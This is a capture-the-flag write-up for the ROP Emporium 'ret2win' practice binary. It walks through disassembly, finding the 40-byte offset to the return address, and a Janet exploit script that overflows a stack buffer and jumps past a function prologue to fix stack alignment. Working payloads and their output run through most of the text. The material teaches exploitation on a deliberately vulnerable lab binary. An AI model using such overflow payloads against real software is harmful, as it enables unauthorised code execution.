# ret2win

https://ropemporium.com/challenge/ret2win.html

## What to Pwn

Helpfully, the binary is not stripped:

```sh
file ret2win
# ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
# linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,
# BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
```

Looking at the disassembly -- based on the function names -- it is obvious,
that we are supposed to modify `pwnme`s stack to return into `ret2win`.

```
objdump -d -M intel_syntax ret2win

# 0000000000400697 <main>:
#   400697:       55                      push   rbp
#   400698:       48 89 e5                mov    rbp,rsp
# 
#   4006cd:       b8 00 00 00 00          mov    eax,0x0
#   4006d2:       e8 11 00 00 00          call   4006e8 <pwnme>
#  ... SNIP ...
# 
# 00000000004006e8 <pwnme>:
#   4006e8:       55                      push   rbp
#   4006e9:       48 89 e5                mov    rbp,rsp
#   4006ec:       48 83 ec 20             sub    rsp,0x20
#   4006f0:       48 8d 45 e0             lea    rax,[rbp-0x20]
#   4006f4:       ba 20 00 00 00          mov    edx,0x20
#   4006f9:       be 00 00 00 00          mov    esi,0x0
#   4006fe:       48 89 c7                mov    rdi,rax
#   400701:       e8 7a fe ff ff          call   400580 <memset@plt>
#  ... SNIP ...
#   400753:       90                      nop
#   400754:       c9                      leave
#   400755:       c3                      ret
# 
# 0000000000400756 <ret2win>:
#   400756:       55                      push   rbp
#   400757:       48 89 e5                mov    rbp,rsp
#  ... SNIP ...
```

`pwnme` allocates on its stack a buffer of size `0x20` (32 bytes).
We overflow it to jump to the beginning of `ret2win`, the address
`0x0000000000400756`

## Locating the RET value

```sh
printf "A%.0s" {1..50} | ./ret2win
# Segmentation fault

sudo dmesg
# [ 4519.690775] traps: ret2win[878] general protection fault ip:400755 sp:7ffe5bfa77a8 error:0 in ret2win[400000+1000]
```

Looking at `dmesg`, it seems we triggered some `trap`, let's try again with a
shorter payload.

```sh
printf 'A%.0s' {1..40} | ./ret2win
# does not trigger a segfault

printf 'A%.0s' {1..41} | ./ret2win
# does not trigger a segfault

printf 'A%.0s' {1..42} | ./ret2win
# Segmentation fault

sudo dmesg
# [ 4641.186949] ret2win[904]: segfault at 404141 ip 0000000000404141 sp 00007fffb8b6cca0 error 14 in ret2win[600000+1000]
```

We see two `0x41`s, so even though 41 doesn't trigger a segfault the return
address must start at the 41st byte offset.
(I wonder if ROPEmporium made it start at the 41st byte (ASCII 'A') on purpose?)

## Crafting an Exploit Script

We use Janet's `string/repeat` to write 40 'A's, then `string/join` the address
to the end of the payload.

```janet
#!/usr/bin/env janet
(use sh)
(def input (string/join [(string/repeat 'A 40) "\x56\x07\x40\x00\x00\x00\x00\x00"]))
(spit "payload.txt" input)
($ ./ret2win < ,input)
```

However, this doesn't quite produce the expected effect:

```sh
janet exploit.janet

# ret2win by ROP Emporium
# x86_64
# 
# For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
# What could possibly go wrong?
# You there, may I have your input please? And don't worry about null bytes, we're using read()!
# 
# > Thank you!
# Well done! Here's your flag:
# error: command(s) (@[./ret2win :< "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV\x07@\0\0\0\0\0"]) failed, exit code(s) @[129]
#   in $* [/usr/local/lib/janet/sh.janet] on line 255, column 5
#   in _thunk [exp2.janet] (tailcall) on line 8, column 1
```

Well done! Here's your flag: ...wait where?

`ltrace` shows us that the process crashes when it tries to `cat` the flag file.

```sh
ltrace ./ret2win < payload.txt

# puts("Well done! Here's your flag:"Well done! Here's your flag:
# )                                                                                             = 29
# system("/bin/cat flag.txt" <no return ...>
# --- SIGSEGV (Segmentation fault) ---
# +++ killed by SIGSEGV +++
```

Looking at the backtrace in GDB gives:

```
(gdb) bt
#0  0x00007ffff7e0fe3c in do_system (line=0x400943 "/bin/cat flag.txt") at ../sysdeps/posix/system.c:148
#1  0x000000000040076e in ret2win ()
#2  0x0000000000000000 in ?? ()
```

So we're failing in `do_system`.
The ROPEmporium's [Beginner's Guide](https://ropemporium.com/guide.html)
mentions something about stack alignment in the "Common Pitfalls" section.

## Don't Mess Up the Stack

We are not limited to jumping to the start of a function, technically we can
jump to anywhere within a function we want to.

After playing around for a while, I found that jumping past `ret2win`s
prologue keeps the stack aligned well enough.

```
(gdb) disassemble ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   %rbp
   0x0000000000400757 <+1>:     mov    %rsp,%rbp
   0x000000000040075a <+4>:     mov    $0x400926,%edi ; <-- We will jump here!
   0x000000000040075f <+9>:     callq  0x400550 <puts@plt>
   0x0000000000400764 <+14>:    mov    $0x400943,%edi
   0x0000000000400769 <+19>:    callq  0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    %rbp
   0x0000000000400770 <+26>:    retq
End of assembler dump.
```

We jump straight to `0x40075A` to avoid setting up a new stack frame.
Our updated exploit script looks like this:

```janet
#!/usr/bin/env janet
(use sh)
(def input (string/join [(string/repeat 'A 40) "\x5a\x07\x40\x00\x00\x00\x00\x00"]))
(spit "payload.txt" input)
($ ./ret2win < ,input)
```

And it works!

```
janet exploit.janet

# ret2win by ROP Emporium
# x86_64
# 
# For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
# What could possibly go wrong?
# You there, may I have your input please? And don't worry about null bytes, we're using read()!
# 
# > Thank you!
# Well done! Here's your flag:
# ROPE{a_placeholder_32byte_flag!}
```
